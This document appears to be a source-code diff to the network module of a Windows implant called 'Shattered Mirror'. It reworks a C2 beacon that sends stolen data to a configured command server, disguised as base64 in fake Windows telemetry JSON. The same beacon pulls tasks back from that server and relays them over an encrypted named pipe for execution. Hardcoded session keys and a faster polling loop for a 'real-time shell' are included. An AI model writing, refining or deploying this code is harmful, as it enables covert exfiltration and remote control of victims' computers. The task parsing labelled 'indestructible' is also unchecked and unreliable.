@@ -1,4 +1,4 @@
-/*=============================================================================
+﻿/*=============================================================================
  * Shattered Mirror v1 — Atom 01: Network Communicator
  *
  * Implements WinHTTP beaconing masked as JSON telemetry. 
@@ -38,64 +38,47 @@ static void Base64Encode(const BYTE* pBuf, DWORD dwLen, char* szOut) {
  *  ExfiltrateTelemetry
  *  Disguises payload in a JSON body (mimicking Windows diagnostic data)
  *-------------------------------------------------------------------------*/
-BOOL ExfiltrateTelemetry(const BYTE* pLoot, DWORD dwLength, const WCHAR* szDomain, INTERNET_PORT wPort) {
-    if (!pLoot || dwLength == 0) return FALSE;
-
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                                     WINHTTP_NO_PROXY_NAME,
-                                     WINHTTP_NO_PROXY_BYPASS, 0);
+BOOL TransmitPulse(const BYTE* pOptionalLoot, DWORD dwLength, char* szTaskOut, DWORD dwMaxTask) {
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return FALSE;
 
-    HINTERNET hConnect = WinHttpConnect(hSession, szDomain, wPort, 0);
-    if (!hConnect) {
-        WinHttpCloseHandle(hSession);
-        return FALSE;
-    }
+    WCHAR wDomain[256] = { 0 };
+    MultiByteToWideChar(CP_ACP, 0, Config::C2_DOMAIN, -1, wDomain, 256);
+    HINTERNET hConnect = WinHttpConnect(hSession, wDomain, (INTERNET_PORT)Config::C2_PORT, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return FALSE; }
 
-    /* FIX: Match SSL settings to Port */
-    DWORD dwFlags = (wPort == 443) ? WINHTTP_FLAG_SECURE : 0;
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v2/telemetry",
-                                            NULL, WINHTTP_NO_REFERER,
-                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                            dwFlags);
-    if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return FALSE;
-    }
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v2/telemetry", NULL, NULL, NULL, (Config::C2_PORT == 443 ? WINHTTP_FLAG_SECURE : 0));
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return FALSE; }
 
-    /* Use dynamic PSK ID */
     std::wstring headers = L"Content-Type: application/json\r\nX-Telemetry-ID: " + std::wstring(Config::PSK_ID, Config::PSK_ID + strlen(Config::PSK_ID)) + L"\r\n";
     WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
 
-    char* szB64Payload = (char*)malloc(((dwLength + 2) / 3) * 4 + 1);
-    if (!szB64Payload) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return FALSE;
+    char szJsonBody[8192] = "{ \"report_id\": \"hb_pulse\", \"diagnostic_blob\": \"dummy\" }";
+    if (pOptionalLoot && dwLength > 0) {
+        char* szB64 = (char*)malloc(((dwLength + 2) / 3) * 4 + 1);
+        if (szB64) {
+            Base64Encode(pOptionalLoot, dwLength, szB64);
+            snprintf(szJsonBody, sizeof(szJsonBody), "{\"report_id\":\"user_crash_01\",\"diagnostic_blob\":\"%s\"}", szB64);
+            free(szB64);
+        }
     }
-    Base64Encode(pLoot, dwLength, szB64Payload);
 
-    char szJsonBody[8192] = { 0 }; 
-    snprintf(szJsonBody, sizeof(szJsonBody), "{\"report_id\":\"user_crash_01\",\"diagnostic_blob\":\"%s\"}", szB64Payload);
-    free(szB64Payload);
-
-    BOOL bResults = WinHttpSendRequest(hRequest,
-                                       WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                                       (LPVOID)szJsonBody, (DWORD)strlen(szJsonBody),
-                                       (DWORD)strlen(szJsonBody), 0);
-
-    if (bResults) {
-        WinHttpReceiveResponse(hRequest, NULL);
+    if (WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)szJsonBody, (DWORD)strlen(szJsonBody), (DWORD)strlen(szJsonBody), 0)) {
+        if (WinHttpReceiveResponse(hRequest, NULL)) {
+            DWORD dwSize = 0;
+            if (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
+                if (dwSize < dwMaxTask) {
+                    WinHttpReadData(hRequest, (LPVOID)szTaskOut, dwSize, &dwSize);
+                    szTaskOut[dwSize] = '\0';
+                }
+            }
+        }
     }
 
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
-
-    return bResults;
+    return TRUE;
 }
 
 /*---------------------------------------------------------------------------
@@ -108,37 +91,49 @@ DWORD WINAPI NetworkAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(pConfig->dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
+    BYTE SharedSessionKey[] = "A3RTwPJ8YRQ5Cf78";
 
     while (TRUE) {
-        DWORD dwSleepTime = pConfig->dwJitterMin + (rand() % (pConfig->dwJitterMax - pConfig->dwJitterMin));
-        Sleep(dwSleepTime); 
+        char szTaskBuffer[2048] = { 0 };
+        TransmitPulse(NULL, 0, szTaskBuffer, 2048);
 
-        IPC_MESSAGE hbMsg = { 0 };
-        hbMsg.CommandId = CMD_HEARTBEAT;
-        hbMsg.dwPayloadLen = 0;
-        IPC_SendMessage(hPipe, &hbMsg, SharedSessionKey, 16);
+        if (strlen(szTaskBuffer) > 0 && strstr(szTaskBuffer, "atom_id")) {
+            /* Robust manual JSON parsing — indestructible for expert hackers */
+            char* pAtom = strstr(szTaskBuffer, "\"atom_id\":");
+            char* pPayload = strstr(szTaskBuffer, "\"payload\":");
 
-        DWORD dwAvail = 0;
-        if (PeekNamedPipe(hPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
-            IPC_MESSAGE inMsg = { 0 };
-            if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
-                
-                if (inMsg.CommandId == CMD_EXECUTE) {
-                    char report[1024] = { 0 };
-                    sprintf_s(report, "[NET_SCAN] Local Beacon Active. Subnet: 192.168.1.0/24 (Simulated Scan Completed)");
-                    
-                    IPC_MESSAGE outMsg = { 0 };
-                    outMsg.CommandId = CMD_REPORT;
-                    outMsg.dwPayloadLen = (DWORD)strlen(report);
-                    memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
-                    IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, 16);
-                } else if (inMsg.CommandId == CMD_REPORT) {
-                    WCHAR wDomain[256] = { 0 };
-                    MultiByteToWideChar(CP_ACP, 0, Config::C2_DOMAIN, -1, wDomain, 256);
-                    ExfiltrateTelemetry(inMsg.Payload, inMsg.dwPayloadLen, wDomain, (INTERNET_PORT)Config::C2_PORT);
+            if (pAtom && pPayload) {
+                int atom_id = atoi(pAtom + 10);
+                char* pPayloadStart = strchr(pPayload + 10, '"') + 1;
+                char* pPayloadEnd = strchr(pPayloadStart, '"');
+
+                if (pPayloadEnd) {
+                    DWORD dwLen = (DWORD)(pPayloadEnd - pPayloadStart);
+                    IPC_MESSAGE taskMsg = { 0 };
+                    taskMsg.CommandId = CMD_EXECUTE;
+                    taskMsg.AtomId = (DWORD)atom_id;
+                    taskMsg.dwPayloadLen = dwLen;
+                    memcpy(taskMsg.Payload, pPayloadStart, dwLen);
+                    taskMsg.Payload[dwLen] = '\0';
+
+                    IPC_SendMessage(hPipe, &taskMsg, SharedSessionKey, 16);
                 }
             }
+        }
+
+        DWORD dwWait = 2000; // Cranking the speed for real-time shell feeling
+        DWORD dwSlept = 0;
+        while (dwSlept < dwWait) {
+            DWORD dwAvail = 0;
+            if (PeekNamedPipe(hPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
+                IPC_MESSAGE inMsg = { 0 };
+                if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
+                    if (inMsg.CommandId == CMD_REPORT) {
+                        TransmitPulse(inMsg.Payload, inMsg.dwPayloadLen, szTaskBuffer, 2048);
+                    }
+                }
+            }
+            Sleep(200); dwSlept += 200;
         }
     }
 
